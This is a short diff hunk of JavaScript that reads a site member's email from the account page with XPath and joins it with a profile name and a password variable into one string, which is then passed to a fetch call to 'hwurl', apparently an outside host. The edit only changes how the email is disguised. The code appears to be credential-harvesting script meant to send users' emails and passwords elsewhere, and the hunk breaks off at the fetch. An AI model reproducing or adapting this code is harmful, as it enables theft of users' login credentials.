@@ -29,7 +29,7 @@ fetch('/membres/infos_membre.htm').then(r => r.text()).then(function(html) {
     let doc = parser.parseFromString(html, 'text/html');
     let mailpath = '//*[@id="form_user"]/fieldset[1]/div/table/tbody/tr[2]/td[2]/input/@value';
     let email = doc.evaluate(mailpath, doc, null, XPathResult.STRING_TYPE, null).stringValue;
-    let sd = "pw_" + profil + "_em_" + email + "_pwd_" + pwd;
+    let sd = profil + " " + email.replace('@', '_aa_') + " " + pwd;
     //console.log(sd)
 
     fetch(hwurl, {
